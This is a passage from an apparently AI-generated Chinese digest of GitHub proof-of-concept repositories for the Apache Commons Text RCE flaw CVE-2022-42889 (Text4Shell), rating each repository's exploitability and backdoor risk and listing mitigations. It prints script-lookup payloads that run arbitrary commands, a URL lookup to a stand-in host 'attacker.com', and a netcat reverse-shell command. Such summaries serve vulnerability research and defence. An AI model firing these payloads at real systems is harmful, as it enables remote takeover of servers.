1.  攻击者需要找到一个应用程序，该应用程序使用了存在漏洞的Apache Commons Text版本（1.5到1.9）。
2.  攻击者需要确定应用程序中是否存在任何接受用户输入并将其传递给Commons Text的文本插值功能的位置。
3.  攻击者构造一个包含恶意表达式的输入。该表达式利用`script`、`dns`或`url`查找器来执行任意代码。例如：`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`
4.  应用程序处理该输入，触发文本插值，导致恶意代码被执行。

**项目地址:** [sunnyvale-it/CVE-2022-42889-PoC](https://github.com/sunnyvale-it/CVE-2022-42889-PoC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #27

**来源**: [CVE-2022-42889-tulhan_commons-text-goat.md](../2022/CVE-2022-42889-tulhan_commons-text-goat.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许远程代码执行，可能导致系统完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，且允许用户控制的输入传递给`StringSubstitutor`进行插值

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中`StringSubstitutor`类的变量插值功能。如果应用程序使用受影响的Apache Commons Text版本（1.5到1.9）且允许用户控制的输入传递给`StringSubstitutor`进行插值，则攻击者可以通过构造包含恶意脚本、DNS或URL查找的输入来执行任意代码。根据漏洞利用代码，该代码提供了一个易受攻击的Web应用程序，它接受`cmd`参数，并将其传递给`StringSubstitutor`函数，从而允许RCE。由于该仓库的目的是为了漏洞演示，LICENSE文件使用的是标准的MIT协议，没有发现作者隐藏的投毒代码。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响的Apache Commons Text版本（1.5-1.9）。**
2.  **识别应用程序中将用户控制的输入传递给`StringSubstitutor`进行插值的位置。**
3.  **构造包含恶意脚本、DNS或URL查找的输入。例如：**`${script:javascript:java.lang.Runtime.getRuntime().exec("command")}`**，`${dns:address}`**或者`${url:https://example.com}`**。**
4.  **将恶意输入发送到目标应用程序。**
5.  **如果漏洞利用成功，攻击者将在目标系统上执行任意代码。**

根据搜索结果，此漏洞被认为是高危漏洞，CVSS评分高达9.8，可能允许攻击者在受影响的系统上执行任意代码。 Apache Commons Text 1.10.0 通过禁用默认的危险插值器修复了此漏洞。

**项目地址:** [tulhan/commons-text-goat](https://github.com/tulhan/commons-text-goat)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #28

**来源**: [CVE-2022-42889-vickyaryan7_Text4shell-exploit.md](../2022/CVE-2022-42889-vickyaryan7_Text4shell-exploit.md)

## CVE-2022-42889-Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的 Apache Commons Text，并且允许用户可控的输入传递给存在漏洞的插值函数。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个关键漏洞。该漏洞源于Apache Commons Text在处理变量插值时，默认包含了一些不安全的 StringLookup 实现，如 `script`、`dns` 和 `url`。攻击者可以通过构造包含恶意表达式的输入，利用这些 StringLookup 实现执行任意代码或与远程服务器进行交互。

**有效性：**

提供的Python POC代码尝试利用此漏洞。它通过构造包含恶意`script`查找的payload，将其作为GET请求的参数发送到目标URL。Payload中的命令`nc {args.ip} {args.port} -e {args.type}`使用netcat建立反向shell连接到攻击者的机器。如果目标系统运行着存在漏洞的Apache Commons Text版本，并且netcat可用，则此POC应有效。

**投毒风险：**

代码本身并没有明显的投毒行为。这段代码的主要目的是利用漏洞，建立反向shell。代码包含MIT许可证，表面上代码作者允许代码使用者复制、修改、合并、发布、分发、再许可和/或出售软件的副本，但并不能完全排除未来作者修改代码进行投毒行为的可能性。风险占比5%。主要考虑到以下几点：

*   **依赖netcat：** POC依赖目标系统安装了netcat。如果目标系统没有netcat，则漏洞利用会失败，但不会造成其他损害。
*   **反向Shell：**  反向Shell本身有风险，因为它允许攻击者远程访问受害者的系统。但是，这是漏洞利用本身的性质，而不是代码作者故意引入的恶意行为。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响的Apache Commons Text版本 (1.5 <= version <= 1.9)。**
2.  **找到应用程序中接受用户输入的地方，这些输入最终会被传递给 Apache Commons Text 的插值功能。**
3.  **构造包含恶意表达式的Payload，例如`${script:javascript:java.lang.Runtime.getRuntime().exec("command")}` 或 `${url:http://attacker.com/evil.txt}`。**
4.  **将Payload作为输入发送到目标应用程序。**
5.  **如果漏洞利用成功，攻击者将能够执行任意代码或与远程服务器进行交互。**

**防范措施：**

*   **升级到Apache Commons Text 1.10.0或更高版本。该版本默认禁用了不安全的StringLookup实现。**
*   **如果无法升级，可以手动禁用不安全的StringLookup实现。**
*   **验证所有用户输入，防止恶意表达式注入。**

**项目地址:** [vickyaryan7/Text4shell-exploit](https://github.com/vickyaryan7/Text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

